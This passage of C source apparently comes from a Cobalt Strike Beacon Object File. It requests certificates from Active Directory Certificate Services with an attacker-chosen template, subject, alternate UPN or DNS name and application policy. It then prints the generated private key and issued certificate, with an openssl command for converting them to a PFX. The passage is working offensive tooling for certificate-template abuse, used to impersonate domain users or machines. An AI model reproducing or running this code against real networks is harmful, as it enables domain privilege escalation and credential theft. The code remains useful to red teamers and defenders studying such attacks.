	CHECK_RETURN_FAIL("pCertRequest2->lpVtbl->GetRequestId()", hr);

	// Check the status of our request
	for( int nRetry = 0; (nRetry < CERT_REQUEST_RETRIES)&&(CR_DISP_UNDER_SUBMISSION==pDisposition); nRetry++ )
	{
		// Get the current disposition message
		SAFE_SYS_FREE(bstrDispositionMessage);
		hr = pCertRequest2->lpVtbl->GetDispositionMessage(pCertRequest2, &bstrDispositionMessage);
		CHECK_RETURN_FAIL("pCertRequest2->lpVtbl->GetDispositionMessage()", hr);
		
		// Check the current disposition
		switch(pDisposition)
		{
			case CR_DISP_ISSUED:
			{
				internal_printf("[*] CA Response   : The certificate had been issued.\n");
				break;
			}
			case CR_DISP_UNDER_SUBMISSION:
			{
				internal_printf("[*] CA Response   : The certificate is still pending: %S\n", bstrDispositionMessage);
				internal_printf("[*] Retry %d of %d. Sleeping %d seconds...\n", nRetry, CERT_REQUEST_RETRIES, CERT_REQUEST_TIMEOUT/1000);
				KERNEL32$Sleep(CERT_REQUEST_TIMEOUT);
				hr = pCertRequest2->lpVtbl->RetrievePending(pCertRequest2, pRequestId, bstrCA, &pDisposition);
				CHECK_RETURN_FAIL("pCertRequest2->lpVtbl->RetrievePending()", hr);
				break;
			}
			default:
			{
				pCertRequest2->lpVtbl->GetLastStatus(pCertRequest2, &hr);
				BeaconPrintf(CALLBACK_ERROR, "CA Response  : The submission failed: %S (0x%08lx)\n", bstrDispositionMessage, hr);
				goto fail;
			}
		} // end check of current disposition
	} // end for loop through retries
	
	if (CR_DISP_ISSUED != pDisposition)
	{
		hr = RPC_E_TIMEOUT;
		internal_printf("[*] CA Response   : Timed out: %d\n", pDisposition);
		goto fail;
	}

	hr = pCertRequest2->lpVtbl->GetCertificate(pCertRequest2, CR_OUT_BASE64, lpbstrCertificate);
	CHECK_RETURN_FAIL("pCertRequest2->lpVtbl->GetCertificate()", hr);

	hr = S_OK;

fail:

	SAFE_SYS_FREE(bstrDispositionMessage);
	SAFE_RELEASE(pCertRequest2);
	SAFE_SYS_FREE(bstrEnrollmentRequest);

	return hr;
} // end _adcs_request_SendCertRequestMessage


HRESULT adcs_request(LPCWSTR lpswzCA, LPCWSTR lpswzTemplate, LPCWSTR lpswzSubject, LPCWSTR lpswzAltName, LPCWSTR lpswzAltUrl, BOOL bInstall, BOOL bMachine, BOOL addAppPolicy, BOOL dns)
{
	HRESULT	hr = S_OK;
	BSTR bstrCA = NULL;
	BSTR bstrTemplate = NULL;
	DWORD dwDistinguishedNameCount = 0;
	LPWSTR lpswzDistinguishedName = NULL;
	BSTR bstrSubject = NULL;
	BSTR bstrAltName = NULL;
	BSTR bstrAltUrl = NULL;
	BSTR bstrExportType = NULL;
	BSTR bstrPrivateKey = NULL;
	BSTR bstrCertificate = NULL;
	DWORD dwPrivateKeyLen = 0;
	LPBYTE pPrivateDER = NULL;
	DWORD pemPrivateSize = 0;
	LPWSTR pPrivatePEM = NULL;
	IX509PrivateKey * pPrivateKey = NULL;
	IX509CertificateRequestPkcs10V3 * pCertificateRequestPkcs10V3 = NULL;
	IX509Enrollment * pEnrollment = NULL;
	

	// Get the Certificate Authority
	if (NULL == lpswzCA)
	{
		hr = E_INVALIDARG;
		BeaconPrintf(CALLBACK_ERROR, "lpswzCA is invalid\n");
		goto fail;
	}
	SAFE_SYS_FREE(bstrCA);
	bstrCA = OLEAUT32$SysAllocString(lpswzCA);

	// Get the template
	SAFE_SYS_FREE(bstrTemplate);

	bstrTemplate = OLEAUT32$SysAllocString(lpswzTemplate); 
	

	// Get the subject name
	SAFE_SYS_FREE(bstrSubject);
	if ( IsNullOrEmptyW(lpswzSubject) )
	{
		if (bMachine)
		{
			SECUR32$GetComputerObjectNameW(NameFullyQualifiedDN, lpswzDistinguishedName, &dwDistinguishedNameCount);
			lpswzDistinguishedName = intAlloc(dwDistinguishedNameCount * sizeof(WCHAR));
			CHECK_RETURN_NULL("intAlloc", lpswzDistinguishedName, hr);
			hr = SECUR32$GetComputerObjectNameW(NameFullyQualifiedDN, lpswzDistinguishedName, &dwDistinguishedNameCount);
			CHECK_RETURN_FALSE("SECUR32$GetComputerObjectNameW", hr);
		}
		else
		{
			SECUR32$GetUserNameExW(NameFullyQualifiedDN, lpswzDistinguishedName, &dwDistinguishedNameCount);
			lpswzDistinguishedName = intAlloc(dwDistinguishedNameCount * sizeof(WCHAR));
			CHECK_RETURN_NULL("intAlloc", lpswzDistinguishedName, hr);
			hr = SECUR32$GetUserNameExW(NameFullyQualifiedDN, lpswzDistinguishedName, &dwDistinguishedNameCount);
			CHECK_RETURN_FALSE("SECUR32$GetUserNameExW", hr);
		}
		bstrSubject = OLEAUT32$SysAllocString(lpswzDistinguishedName);
	}
	else { bstrSubject = OLEAUT32$SysAllocString(lpswzSubject); }

	// Get the alt name
	SAFE_SYS_FREE(bstrAltName);
	bstrAltName = OLEAUT32$SysAllocString(lpswzAltName);

	SAFE_SYS_FREE(bstrAltUrl);
	bstrAltUrl = OLEAUT32$SysAllocString(lpswzAltUrl);

	internal_printf("[*] CA            : %S\n", bstrCA);
	internal_printf("[*] Template      : %S\n", bstrTemplate);
	internal_printf("[*] Subject       : %S\n", bstrSubject);
	internal_printf("[*] AltName (%s) : %S\n", (dns) ? "dns" : "upn", (bstrAltName?bstrAltName:L"N/A"));
	internal_printf("[*] AltUrl        : %S\n", (bstrAltUrl?bstrAltUrl:L"N/A"));

	// Initialize COM
	hr = OLE32$CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
	if (FAILED(hr) && hr != RPC_E_CHANGED_MODE)
	{
		CHECK_RETURN_FAIL("CoInitializeEx", hr);
	}

	// Create the private key
	hr = _adcs_request_CreatePrivateKey(bMachine, &pPrivateKey);
	CHECK_RETURN_FAIL(L"_adcs_request_CreatePrivateKey", hr);

	// Export the private key
	bstrExportType = OLEAUT32$SysAllocString(BCRYPT_PRIVATE_KEY_BLOB);
	SAFE_SYS_FREE(bstrPrivateKey);
	hr = pPrivateKey->lpVtbl->Export(pPrivateKey, bstrExportType, XCN_CRYPT_STRING_BINARY, &bstrPrivateKey);
	CHECK_RETURN_FAIL("pPrivateKey->lpVtbl->Export()", hr);
	
	// Convert from BCRYPT_PRIVATE_KEY_BLOB to DER
    CRYPT32$CryptEncodeObjectEx(X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, PKCS_RSA_PRIVATE_KEY, (LPCVOID)bstrPrivateKey, 0, NULL, NULL, &dwPrivateKeyLen);
    pPrivateDER = (LPBYTE)intAlloc(dwPrivateKeyLen);
	CHECK_RETURN_NULL("intAlloc", pPrivateDER, hr);
    hr = CRYPT32$CryptEncodeObjectEx(X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, PKCS_RSA_PRIVATE_KEY, (LPCVOID)bstrPrivateKey, 0, NULL, (LPVOID)pPrivateDER, &dwPrivateKeyLen);
	CHECK_RETURN_FALSE("CRYPT32$CryptEncodeObjectEx", hr);

    // Convert from DER to PEM format
	CRYPT32$CryptBinaryToStringW(pPrivateDER, dwPrivateKeyLen, CRYPT_STRING_BASE64, NULL, &pemPrivateSize);
    pPrivatePEM = (LPWSTR)intAlloc(pemPrivateSize*sizeof(WCHAR));
	CHECK_RETURN_NULL("intAlloc", pPrivatePEM, hr);
    hr = CRYPT32$CryptBinaryToStringW(pPrivateDER, dwPrivateKeyLen, CRYPT_STRING_BASE64, pPrivatePEM, &pemPrivateSize);
	CHECK_RETURN_FALSE("CRYPT32$CryptBinaryToStringW", hr);

	// Create the cert request
	hr = _adcs_request_CreateCertRequest(bMachine, pPrivateKey, bstrTemplate, bstrSubject, bstrAltName, bstrAltUrl, &pCertificateRequestPkcs10V3, addAppPolicy, dns);
	CHECK_RETURN_FAIL(L"_adcs_request_CreatePrivateKey", hr);

	// Create enrollment
	hr = _adcs_request_CreateEnrollment(pCertificateRequestPkcs10V3, &pEnrollment);
	CHECK_RETURN_FAIL(L"_adcs_request_CreatePrivateKey", hr);

	// Submit the enrollment request
	hr = _adcs_request_SubmitEnrollment(pEnrollment, bstrCA, &bstrCertificate);
	CHECK_RETURN_FAIL(L"_adcs_request_SubmitEnrollment", hr);

	// Display the certificate
	internal_printf("[*] cert.pem      :\n");
	internal_printf("-----BEGIN RSA PRIVATE KEY-----\n");
	internal_printf("%S", pPrivatePEM);
	internal_printf("-----END RSA PRIVATE KEY-----\n");
	internal_printf("-----BEGIN CERTIFICATE-----\n");
	internal_printf("%S", bstrCertificate);
	internal_printf("-----END CERTIFICATE-----\n");
	internal_printf("[*] Convert with  :\nopenssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx\n");
	

	// Install the certificate?
	if (bInstall)
	{
		hr = pEnrollment->lpVtbl->InstallResponse(pEnrollment, AllowUntrustedRoot, bstrCertificate, XCN_CRYPT_STRING_BASE64, NULL);
		CHECK_RETURN_FAIL("pEnrollment->lpVtbl->InstallResponse()", hr);

		internal_printf("[*] Certificate installed!\n");
	}

	hr = S_OK;

fail:

	
	SAFE_RELEASE(pEnrollment);
	SAFE_RELEASE(pCertificateRequestPkcs10V3);
	SAFE_RELEASE(pPrivateKey);
	SAFE_INT_FREE(pPrivateDER);
	SAFE_INT_FREE(pPrivatePEM);
	SAFE_SYS_FREE(bstrCertificate);
	SAFE_SYS_FREE(bstrPrivateKey);
	SAFE_SYS_FREE(bstrExportType);
	SAFE_SYS_FREE(bstrAltName);
	SAFE_SYS_FREE(bstrAltUrl);
	SAFE_SYS_FREE(bstrSubject);
	SAFE_INT_FREE(lpswzDistinguishedName);
	SAFE_SYS_FREE(bstrTemplate);
	SAFE_SYS_FREE(bstrCA);

	OLE32$CoUninitialize();

	return hr;
} // end adcs_request
